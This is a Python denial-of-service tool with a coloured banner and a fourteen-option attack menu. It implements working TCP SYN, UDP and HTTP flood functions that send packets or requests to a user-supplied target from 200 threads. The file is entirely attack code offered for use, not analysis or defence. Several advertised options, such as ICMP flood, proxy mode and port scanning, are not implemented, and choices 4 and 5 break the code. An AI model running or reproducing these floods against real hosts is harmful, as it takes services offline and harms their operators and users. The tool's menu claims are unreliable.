import os
import random
import threading
import requests
import socks
import socket
from scapy.all import *

# Color Setup
colors = ["\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[95m", "\033[96m", "\033[97m"]
color_index = 0

# Stylish Banner
def banner():
    global color_index
    os.system("clear")
    print(colors[color_index] + """
  __  _________  __  
 / / / / ____/ |/ /  
/ /_/ / __/  |   /   
/ __  / /___ /   |   
/_/ /_/____//_/|_|   
""" + "\033[0m")
    color_index = (color_index + 1) % len(colors)

# Attack Functions (Live Output)
def tcp_syn_flood(target_ip, target_port):
    while True:
        try:
            packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            print(f"\033[92m[SENT] TCP SYN Packet to {target_ip}:{target_port}\033[0m")
        except Exception as e:
            print(f"\033[91m[FAILED] TCP SYN Failed: {str(e)}\033[0m")

def udp_flood(target_ip, target_port):
    while True:
        try:
            packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=os.urandom(1024))
            send(packet, verbose=False)
            print(f"\033[92m[SENT] UDP Packet to {target_ip}:{target_port}\033[0m")
        except Exception as e:
            print(f"\033[91m[FAILED] UDP Attack Failed: {str(e)}\033[0m")

def http_flood(target_ip):
    while True:
        headers = {"User-Agent": f"Mozilla/5.0 ({random.randint(1, 99)})"}
        try:
            response = requests.get(f"http://{target_ip}", headers=headers)
            print(f"\033[92m[SENT] HTTP Request to {target_ip} | Status: {response.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91m[FAILED] HTTP Request Failed: {str(e)}\033[0m")

# Attack Menu
def attack_menu():
    print("\033[93m1. TCP SYN Flood")
    print("2. UDP Flood")
    print("3. HTTP Flood")
    print("4. ICMP (Ping) Flood")
    print("5. Hybrid Attack (TCP+UDP+HTTP)")
    print("6. Multi-Threaded Attack")
    print("7. Auto Proxy Mode")
    print("8. Extreme High-Speed Mode")
    print("9. Random User-Agent & Header Spoofing")
    print("10. Custom Port Attack")
    print("11. Geo-IP Based Target Optimization")
    print("12. Packet Size Customization")
    print("13. Port Scanning")
    print("14. Exit\033[0m")

# Main Function (No Exit on Error)
def main():
    while True:
        banner()
        attack_menu()
        choice = input("\033[91mEnter Your Choice: \033[0m")

        if choice in ["1", "2", "3", "4", "5"]:
            target_ip = input("\033[92mEnter Target IP: \033[0m")
            try:
                target_port = int(input("\033[92mEnter Target PORT (1-65535): \033[0m"))
                if target_port < 1 or target_port > 65535:
                    print("\033[91mInvalid Port! Auto-Correcting to 65535.\033[0m")
                    target_port = 65535
            except ValueError:
                print("\033[91mInvalid Input! Setting Default Port to 80.\033[0m")
                target_port = 80

            threads = []
            for _ in range(200):  # 200 Threads for Extreme Speed
                if choice == "1":
                    t = threading.Thread(target=tcp_syn_flood, args=(target_ip, target_port))
                elif choice == "2":
                    t = threading.Thread(target=udp_flood, args=(target_ip, target_port))
                elif choice == "3":
                    t = threading.Thread(target=http_flood, args=(target_ip,))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

        elif choice == "14":
            print("\033[92mExiting...\033[0m")
            break
        else:
            print("\033[91mInvalid Choice! Try Again.\033[0m")
            input("\033[93mPress Enter to Continue...\033[0m")  # টুল বন্ধ না করে মেনুতে ফিরে যাবে

if __name__ == "__main__":
    main()
